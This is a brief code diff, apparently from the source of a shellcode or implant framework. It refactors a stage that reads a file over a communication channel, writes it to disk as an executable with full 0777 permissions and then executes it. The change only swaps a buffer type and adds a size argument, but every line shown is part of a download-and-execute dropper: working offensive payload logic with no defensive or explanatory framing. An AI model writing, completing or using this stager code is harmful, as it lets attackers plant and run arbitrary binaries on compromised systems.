@@ -17,11 +17,11 @@ SHELLCODE_ENTRY
     channel.read(&file_sz, sizeof(file_sz));
     
     /* Read the file data. */
-    Memory::Buffer file_contents(file_sz, Memory::READ | Memory::WRITE);
+    Memory::Region file_contents(file_sz);
     channel.read(file_contents.pointer(), file_sz);
 
     /* Drop executable file. */
-    File::create(file_path, File::TRUNCATE | File::WRITE, 0777).write(file_contents);
+    File::create(file_path, File::TRUNCATE | File::WRITE, 0777).write(file_contents, file_sz);
 
     /* Execute the dropped executable. */
     Process::execute(channel, file_path);
